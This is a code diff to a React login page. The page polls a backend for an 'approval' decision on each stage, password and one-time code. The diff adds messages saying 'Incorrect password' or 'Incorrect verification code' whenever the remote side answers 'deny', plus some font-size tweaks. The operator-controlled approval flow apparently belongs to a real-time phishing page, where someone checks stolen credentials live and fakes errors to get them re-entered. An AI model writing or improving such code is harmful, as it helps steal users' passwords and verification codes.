@@ -93,7 +93,13 @@ export default function LoginPage() {
           } else if (result.data.action === "deny") {
             setApprovalMessage("")
             setAwaitingApproval(false)
-            setLoginError("")
+            // Show page-specific error based on current stage
+            if (approvalStage === "password") {
+              setLoginError("Incorrect password. Please try again.")
+              setLoginStep("password")
+            } else if (approvalStage === "otp") {
+              setOtpError("Incorrect verification code. Please try again.")
+            }
           } else if (result.data.action === "redirect") {
             setApprovalMessage("")
             await wait(1500)
@@ -106,7 +112,7 @@ export default function LoginPage() {
     }, 2000)
 
     return () => window.clearInterval(pollInterval)
-  }, [awaitingApproval, approvalId])
+  }, [awaitingApproval, approvalId, approvalStage])
 
   useEffect(() => {
     if (resendCooldown <= 0) return
@@ -401,7 +407,7 @@ export default function LoginPage() {
                                               setUsername(e.target.value)
                                               if (loginError) setLoginError("")
                                             }}
-                                            className="h-[30px] border border-[#5C6B7A] rounded-[4px] focus-visible:ring-2 focus-visible:ring-[#005F9E] focus-visible:border-[#005F9E] w-[160px] px-[10px]"
+                                            className="h-[30px] border border-[#5C6B7A] rounded-[4px] focus-visible:ring-2 focus-visible:ring-[#005F9E] focus-visible:border-[#005F9E] w-[160px] px-[10px] text-[15px]"
                                             disabled={awaitingApproval}
                                           />
                                           <a href="#" className="text-[13px] text-[#005F9E] hover:underline whitespace-nowrap">
@@ -473,7 +479,7 @@ export default function LoginPage() {
                                                 setPassword(e.target.value)
                                                 if (loginError) setLoginError("")
                                               }}
-                                              className="h-[30px] border border-[#5C6B7A] rounded-[4px] focus-visible:ring-2 focus-visible:ring-[#005F9E] focus-visible:border-[#005F9E] w-full px-[10px]"
+                                              className="h-[30px] border border-[#5C6B7A] rounded-[4px] focus-visible:ring-2 focus-visible:ring-[#005F9E] focus-visible:border-[#005F9E] w-full px-[10px] text-[15px]"
                                               disabled={awaitingApproval}
                                             />
                                             <button
